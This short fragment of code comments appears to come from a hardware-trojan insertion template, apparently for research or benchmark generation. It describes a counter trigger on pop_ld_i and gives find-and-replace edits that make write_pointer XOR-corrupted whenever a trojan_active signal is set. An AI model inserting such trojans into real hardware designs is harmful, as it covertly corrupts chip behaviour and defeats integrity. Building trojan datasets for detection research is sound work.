 ...
 *   
 * Trigger: Counter on pop_ld_i
 * Payload: Corrupt write_pointer with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt write_pointer with XOR
//
// Integration Script Must Modify:
//
// IF write_pointer is assigned:
//   Find: assign write_pointer = data_value;
//   Replace: assign write_pointer = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF write_pointer is in always_ff:
//   Find: write_pointer <= data_value;
//   Replace: write_pointer <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
